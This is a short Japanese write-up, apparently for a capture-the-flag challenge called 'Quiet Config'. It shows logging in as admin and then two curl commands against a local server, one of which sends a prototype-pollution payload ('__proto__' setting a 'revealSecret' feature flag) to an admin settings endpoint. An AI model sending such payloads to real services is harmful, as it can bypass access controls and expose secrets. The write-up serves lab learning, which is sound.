# Quiet Config (Prototype Pollution) - Writeup

## 解法の流れ

1. 管理者としてログインする  
   - `/login` にて `admin / <取得したPW>` を入力

2. 管理者ページから設定 API を発見  
   - `/admin/feature-flags` に JSON を送信できる

3. **プロトタイプ汚染を試す**  
   ```bash
   curl -s -b c -c c -d "user=admin&password=adm-xxxx" http://127.0.0.1:8000/login >/dev/null
   curl -s -b c -X POST -d 'json={"__proto__":{"featureFlags":{"revealSecret":true}}}' http://127.0.0.1:8000/admin/feature-flags
